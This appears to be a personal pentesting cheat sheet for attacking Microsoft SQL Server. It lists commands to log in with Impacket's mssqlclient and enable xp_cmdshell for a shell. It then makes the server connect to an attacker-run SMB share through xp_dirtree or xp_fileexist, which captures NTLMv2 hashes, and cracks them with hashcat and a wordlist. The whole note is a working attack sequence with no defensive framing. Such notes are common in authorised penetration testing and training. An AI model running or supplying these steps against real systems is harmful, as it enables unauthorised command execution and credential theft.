---
title: MS-SQL-SERVER
updated: 2023-10-13 08:26:44Z
created: 2023-10-13 07:16:08Z
latitude: -33.86881970
longitude: 151.20929550
altitude: 0.0000
---

1.  Connect to MS-SQL server:
`mssqlclient.py <DOMAIN\user>:<password>@<target IP> -windows-auth`

2. Get a shell:
`enable_xp_cmdshell`
`xp_cmdshell <commands>`

3. If user does not have permission, check who has sa permissions:
`select IS_SRVROLEMEMBER ('sysadmin')`

4. If permission not available, **steal the hashes** using **xp_dirtree** or **xp_fileexist**
Setup samba share on Kali:
`smbserver.py myshare ~/transfer/`
or
`smbserver.py -smb2support myshare ~/transfer/`

5. Run **xp_dirtree** or **xp_fileexist** to capture hashes:
`exec xp_dirtree '\\<hacker ip>\myshare\',1,1`
`exec xp_fileexist '\\<hacker ip>\myshare\',1,1`

6. Copy NTLM2 hash to **hash.txt** and crack with **Hashcat** or **John**:
`hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`

Preferabbly run on windows bare-metal to use GPU:
`hashcat64 -m 5600 hash.txt rockyou.txt -0`